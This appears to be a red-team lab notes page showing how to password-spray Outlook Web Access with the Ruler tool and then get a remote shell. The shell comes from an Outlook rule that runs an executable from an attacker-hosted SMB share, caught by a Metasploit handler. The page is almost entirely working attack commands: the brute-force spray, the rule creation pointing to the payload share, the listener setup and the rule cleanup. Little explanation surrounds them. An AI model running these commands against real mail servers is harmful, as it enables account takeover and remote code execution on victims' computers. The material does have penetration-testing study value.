# Password Spraying Outlook Web Access: Remote Shell

{% hint style="warning" %}
Work In Progress
{% endhint %}

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
ruler -k --domain offense.local brute --users users --passwords passwords --verbose
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2018-12-23-15-09-03.png)

![](../.gitbook/assets/peek-2018-12-23-15-07.gif)

![](../.gitbook/assets/screenshot-from-2018-12-23-15-08-18.png)

## Getting a Shell via Malicious Email Rule

```csharp
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```

![](../.gitbook/assets/screenshot-from-2018-12-23-17-15-36.png)

```text
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location "c:/windows/system32/calc.exe" --trigger "popashell" --name maliciousrule
```

![](../.gitbook/assets/screenshot-from-2018-12-23-17-19-17.png)

```csharp
smbserver.py tools /root/tools/
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
use exploit/multi/handler 
set lhost 10.0.0.5
set lport 443
exploit

```

Delete malicious email rule:

```text
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
```

![](../.gitbook/assets/peek-2018-12-23-18-13.gif)

![](../.gitbook/assets/screenshot-from-2018-12-23-18-17-10.png)

